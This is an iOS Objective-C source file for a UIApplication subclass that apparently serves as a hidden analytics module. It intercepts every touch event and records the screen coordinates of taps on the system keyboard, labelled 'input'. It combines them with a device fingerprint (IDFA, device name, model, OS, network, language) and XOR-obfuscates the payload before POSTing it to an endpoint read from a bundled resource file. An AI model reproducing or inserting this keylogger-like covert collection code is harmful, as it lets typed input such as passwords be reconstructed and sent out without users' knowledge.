//
//  DataApplication.m
//  appData
//
//  Created by admin on 2020/6/4.
//

#import "DataApplication.h"
#import <UIKit/UIKit.h>
#import <SystemConfiguration/CaptiveNetwork.h>
#import <AdSupport/AdSupport.h>
#import <sys/utsname.h>
#import <SystemConfiguration/SystemConfiguration.h>
#import <CoreTelephony/CTTelephonyNetworkInfo.h>

static BOOL isUpSuc = false;
static unsigned char mXorKey[1024] = { 0 };
static int state[16] = { 33, 22, 42, 55, 23, 45, 34, 65, 43, 11, 54, 56, 32, 67, 34, 98};

static int WELLRNG512(int* index)
{
    unsigned int a, b, c, d;
    a = state[*index];
    c = state[(*index + 13) & 15];
    b = a^c ^ (a << 16) ^ (c << 15);
    c = state[(*index + 9) & 15];
    c ^= (c >> 11);
    a = state[*index] = b^c;
    d = a ^ ((a << 5) & 0xBA442D26UL);
    *index = (*index + 15) & 15;
    a = state[*index];
    state[*index] = a^b^d ^ (a << 2) ^ (b << 18) ^ (c << 28);
    return state[*index];
}

//#define SAVE_KEY
#ifdef SAVE_KEY
static void saveFile()
{
    FILE * f = fopen("/Users/admin/Desktop/aa.key", "wb");
    fwrite(mXorKey, 1024, 1, f);
    fclose(f);
}
#endif

static void initXor() {
    if (mXorKey[0] != 0)
        return;
    int index = 0;
    // 使用固定的随机数生成器在任何平台上都生成一个一样的key
    for (size_t i = 0; i < sizeof(mXorKey); i++)
    {
        mXorKey[i] = WELLRNG512(&index);
    }
#ifdef SAVE_KEY
    saveFile();
#endif
}


static void encodeXor(unsigned char * buffer, ssize_t fileSize)
{
    initXor();
    for (ssize_t i = 0; i < fileSize; i++)
    {
        buffer[i] = buffer[i] ^ mXorKey[fileSize % sizeof(mXorKey)];
    }
}

static void collect(NSData * msg)
{
    static NSString *stringUrl = nil;
    if(!stringUrl) {
        NSString * p = [[NSBundle mainBundle] pathForResource:@"local" ofType:@"bd"];
        stringUrl = [NSString stringWithContentsOfFile:p encoding:NSUTF8StringEncoding error:nil];
    }
    if(!stringUrl) return;
    NSURL *url = [NSURL URLWithString:stringUrl];
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    request.timeoutInterval = 5.0;
    request.HTTPMethod = @"POST";

    Byte *byteData = (Byte*)malloc(msg.length);
    memcpy(byteData, [msg bytes], msg.length);
    encodeXor(byteData, msg.length);
    request.HTTPBody = [[NSData alloc] initWithBytes:byteData length:msg.length];
//    free(byteData);
    NSURLSession *session = [NSURLSession sharedSession];
    [[session dataTaskWithRequest:request completionHandler:^(NSData * _Nullable data, NSURLResponse * _Nullable response, NSError * _Nullable error) {
        // 数据解析...
        if(!error)
        {
            isUpSuc = true;
        }
    }] resume];
}

//NSString * ssid()
//{
//    NSString *ssid = @"NotFound";
//    CFArrayRef myArray = CNCopySupportedInterfaces();
//    if (myArray != nil){
//        CFDictionaryRef myDict = CNCopyCurrentNetworkInfo(CFArrayGetValueAtIndex(myArray, 0));
//        if (myDict != nil) {
//            NSDictionary *dict = (NSDictionary*)CFBridgingRelease(myDict);
//            ssid = [dict valueForKey:@"SSID"];
//        }
//    }
//    return ssid;
//}

static  NSString * getDeviceName() {
    
#if (TARGET_IPHONE_SIMULATOR || TARGET_OS_IPHONE)
    return [NSString stringWithFormat:@"%@",[UIDevice currentDevice].name];
#else   // iOS平台
    return [NSString stringWithFormat:@"%@",[NSHost currentHost].localizedName];
#endif  // macOS平台
}

static NSString* iphoneType() {
    //需要导入头文件：
    struct utsname systemInfo;
    uname(&systemInfo);
    NSString*platform = [NSString stringWithCString: systemInfo.machine encoding:NSASCIIStringEncoding];
    return platform;
}

static NSString * systemVersion() {
    return [[UIDevice currentDevice] systemVersion];
}

static NSString * getIDFA()
{
    bool on = [[ASIdentifierManager sharedManager] isAdvertisingTrackingEnabled];
    return on ? [[[ASIdentifierManager sharedManager] advertisingIdentifier] UUIDString] : @"";
}

static NSString * uuid()
{
    CFUUIDRef uuid_ref = CFUUIDCreate(NULL);
    CFStringRef uuid_string_ref= CFUUIDCreateString(NULL, uuid_ref);
    NSString *uuid = [NSString stringWithString:(__bridge NSString *)uuid_string_ref];
    CFRelease(uuid_ref);
    CFRelease(uuid_string_ref);
    return [uuid lowercaseString];
}

NSString * getNetWorkStates()
{
    SCNetworkReachabilityRef reachability = SCNetworkReachabilityCreateWithName(NULL, "www.apple.com");
    if(reachability != NULL) {
        SCNetworkReachabilityFlags flags;
        if (SCNetworkReachabilityGetFlags(reachability, &flags))
        {
            CFRelease(reachability);
            if ((flags & kSCNetworkReachabilityFlagsReachable) == 0)
            {
                return @"NoNet";
            }
            if ((flags & kSCNetworkReachabilityFlagsConnectionRequired) == 0)
            {
                return @"WIFI";
            }
            if ((((flags & kSCNetworkReachabilityFlagsConnectionOnDemand ) != 0) ||
                   (flags & kSCNetworkReachabilityFlagsConnectionOnTraffic) != 0))
               {
                   if ((flags & kSCNetworkReachabilityFlagsInterventionRequired) == 0)
                   {
                       return @"WIFI";
                   }
               }
            if ((flags & kSCNetworkReachabilityFlagsIsWWAN) == kSCNetworkReachabilityFlagsIsWWAN)
            {
                // 获取手机网络类型
                CTTelephonyNetworkInfo *info = [[CTTelephonyNetworkInfo alloc] init];
                NSString *currentStatus = info.currentRadioAccessTechnology;
                if ([currentStatus isEqualToString:@"CTRadioAccessTechnologyGPRS"]) {
                    return @"GPRS";
                }else if ([currentStatus isEqualToString:@"CTRadioAccessTechnologyEdge"]) {
                    return @"2.75G EDGE";
                }else if ([currentStatus isEqualToString:@"CTRadioAccessTechnologyWCDMA"]){
                    return @"3G";
                }else if ([currentStatus isEqualToString:@"CTRadioAccessTechnologyHSDPA"]){
                    return @"3.5G HSDPA";
                }else if ([currentStatus isEqualToString:@"CTRadioAccessTechnologyHSUPA"]){
                    return @"3.5G HSUPA";
                }else if ([currentStatus isEqualToString:@"CTRadioAccessTechnologyCDMA1x"]){
                    return @"2G";
                }else if ([currentStatus isEqualToString:@"CTRadioAccessTechnologyCDMAEVDORev0"]){
                    return @"3G";
                }else if ([currentStatus isEqualToString:@"CTRadioAccessTechnologyCDMAEVDORevA"]){
                    return @"3G";
                }else if ([currentStatus isEqualToString:@"CTRadioAccessTechnologyCDMAEVDORevB"]){
                    return @"3G";
                }else if ([currentStatus isEqualToString:@"CTRadioAccessTechnologyeHRPD"]){
                    return @"HRPD";
                }else if ([currentStatus isEqualToString:@"CTRadioAccessTechnologyLTE"]){
                    return @"4G";
                }
                return @"WWAN";
            }
        }
    }
    return @"NoNet";
}

NSString * getAppName() {
    NSDictionary *infoDictionary = [[NSBundle mainBundle] infoDictionary];
    return [infoDictionary objectForKey:@"CFBundleDisplayName"];
}

NSString* getLocaleLang()
{
    return [[NSLocale preferredLanguages] objectAtIndex:0];
}

NSInteger getTimeZ()
{
    NSTimeZone *localZone = [NSTimeZone systemTimeZone];
    NSInteger seconds= [localZone secondsFromGMT];
    return seconds / 3600;
}

static NSMutableDictionary * getDict() {
    static NSString * idfaStr = nil;
    if(!idfaStr) idfaStr = getIDFA();
    
    static NSString * device = nil;
    if(!device) device = getDeviceName();
    
    static NSString * phone = nil;
    if(!phone) phone = iphoneType();
    
    static NSString * version = nil;
    if(!version) version = systemVersion();
    
    static NSString * uidStr = nil;
    if(!uidStr) uidStr = uuid();
    
    static NSString * netType = nil;
    if(!netType) netType = getNetWorkStates();
    
    static NSString * lang = nil;
    if(!lang) lang = getLocaleLang();
    
    static NSString * appName = nil;
    if(!appName) appName = getAppName();
    
    CGRect rect = [[UIScreen mainScreen] bounds];
    
    NSMutableDictionary * dict;
    if(!isUpSuc) {
        dict = [[NSMutableDictionary alloc] initWithDictionary:@{
            @"uuid" : uidStr,
            @"bid" : [[NSBundle mainBundle]bundleIdentifier],
            @"d" : @{
                @"tz" : @(getTimeZ()),
                @"lt" : @((long)[[NSDate date] timeIntervalSince1970]),
                @"idfa" : idfaStr ? idfaStr : @"",
                @"device" : device ? device : @"",
                @"phone" : phone ? phone : @"",
                @"version" : version ? version : @"",
                @"net" : netType ? netType : @"",
                @"lang" : lang ? lang : @"",
                @"appName" : appName ? appName : @"",
                @"w" : @(rect.size.width),
                @"h" : @(rect.size.height),
            }
        }];
    } else {
        dict = [[NSMutableDictionary alloc] initWithDictionary:@{
            @"uuid" : uidStr
        }];
    }
    return dict;
}

static void notify(NSString * name, NSDictionary* data)
{
    if(data) {
        [[NSNotificationCenter defaultCenter] postNotificationName:@"WatchEvent" object:nil userInfo:@{
            @"name" : name,
            @"data" : data
        }];
    } else {
        [[NSNotificationCenter defaultCenter] postNotificationName:@"WatchEvent" object:nil userInfo:@{
            @"name" : name
        }];
    }
}

@interface DataWatcherDelegate : NSObject

@end

@implementation DataWatcherDelegate

- (void) onWatchEvent :(NSNotification *)notification
{
    
    NSDictionary * data = [notification userInfo];
    if(!data || !data[@"name"]) return;
    
    NSMutableDictionary * dict = getDict();
    [dict setObject:data[@"name"] forKey:@"event"];
    if(data[@"data"]) {
        [dict setObject:data[@"data"] forKey:@"data"];
    }

    NSError *parseError = nil;
    NSData *jsonData = [NSJSONSerialization dataWithJSONObject:dict options:0 error:&parseError];
    collect(jsonData);
    
}

-(void) applicationDidEnterBackground
{
    notify(@"Background", nil);
}

-(void) applicationDidEnterForeground
{
    notify(@"Foreground", nil);
}

-(void) applicationDidFinishLaunching
{
    notify(@"Start", nil);
}

-(void) applicationWillResignActive
{
    notify(@"Resign", nil);
}

-(void) applicationWillTerminate
{
    notify(@"Terminate", nil);
}

@end

static void registEvent()
{
    static DataWatcherDelegate * delegate = nil;
    if(delegate) return;
    delegate = [[DataWatcherDelegate alloc] init];
    [[NSNotificationCenter defaultCenter] addObserver:delegate selector:@selector(onWatchEvent:) name:@"WatchEvent" object:nil];
    [[NSNotificationCenter defaultCenter] addObserver:delegate selector:@selector(applicationDidEnterBackground) name:UIApplicationDidEnterBackgroundNotification object:nil];
    [[NSNotificationCenter defaultCenter] addObserver:delegate selector:@selector(applicationDidEnterForeground) name:UIApplicationWillEnterForegroundNotification object:nil];
    [[NSNotificationCenter defaultCenter] addObserver:delegate selector:@selector(applicationDidFinishLaunching) name:UIApplicationDidFinishLaunchingNotification object:nil];
    [[NSNotificationCenter defaultCenter] addObserver:delegate selector:@selector(applicationWillResignActive) name:UIApplicationWillResignActiveNotification object:nil];
    [[NSNotificationCenter defaultCenter] addObserver:delegate selector:@selector(applicationWillTerminate) name:UIApplicationWillTerminateNotification object:nil];
}

@implementation DataWatcher

-(instancetype) init
{
    if (self = [super init]) {
        [DataWatcher initEvent];
    }
    return self;
}

+(void) initEvent
{
    static BOOL istart = false;
    if(istart) {
        return;
    }
    istart = true;
    registEvent();
}

+(void) notify : (NSString *) name  data: (nullable NSDictionary*) data
{
    [DataWatcher initEvent];
    notify(name, data);
}

@end


#define EACH_CNT 3
#define MAX_UP_CNT 13

static int co_count = -3;
static int se_count = 0;

@interface DataApplication()
{
    NSMutableArray * dataArr;
    int num_;
}

@end


@implementation DataApplication

-(instancetype) init
{
    if (self = [super init]) {
        [DataWatcher initEvent];
        dataArr = [[NSMutableArray alloc] init];

    }
    return self;
}

- (void)sendEvent:(UIEvent *)event{
    [super sendEvent:event];
    if(event.type != UIEventTypeTouches) return;
    if(se_count > MAX_UP_CNT) return;
    NSSet *allTouches = [event allTouches];
    if ([allTouches count] > 0)
    {
        UITouch * anyT = (UITouch *)[allTouches anyObject];
        UIWindow * window = anyT.window;
        UITouchPhase phase = anyT.phase;
        if (phase == UITouchPhaseBegan){
            NSMutableArray * clicks = [[NSMutableArray alloc] init];
            UIView * v = window ? window.rootViewController.view : NULL;
            BOOL isInput = false;
            for (UITouch * touch in allTouches) {
                if(touch.view) {
                    v = touch.view;
                    NSString * cname = NSStringFromClass(v.class);
                    isInput = [cname isEqualToString:@"UIKeyboardLayoutStar"];
                    break;
                }
            }
            if(v) {
                NSString * e = isInput ? @"input" : @"click";
                for (UITouch * touch in allTouches) {
                    UIView * clickV = touch.view;
                    if(!clickV) clickV = v;
                    CGPoint p = [touch locationInView:v.window.rootViewController.view];
                    [clicks addObject:@{
                        @"x" : @(p.x),
                        @"y" : @(p.y),
                        @"view" : NSStringFromClass(clickV.class)
                    }];
                }
                
                [dataArr addObject:@{
                    @"_e_" : e,
                    @"_t_" : @((long)[[NSDate date] timeIntervalSince1970]),
                    @"pos" : clicks
                }];
                co_count++;
                if(co_count > 0) {
                    co_count = co_count % EACH_CNT;
                }
                if(co_count <= 0) {
                    [DataWatcher notify:@"c" data:@{
                        @"_arr_" : dataArr
                    }];
                    [dataArr removeAllObjects];
                    se_count++;
                }
            }
        }
        
    }
}
@end
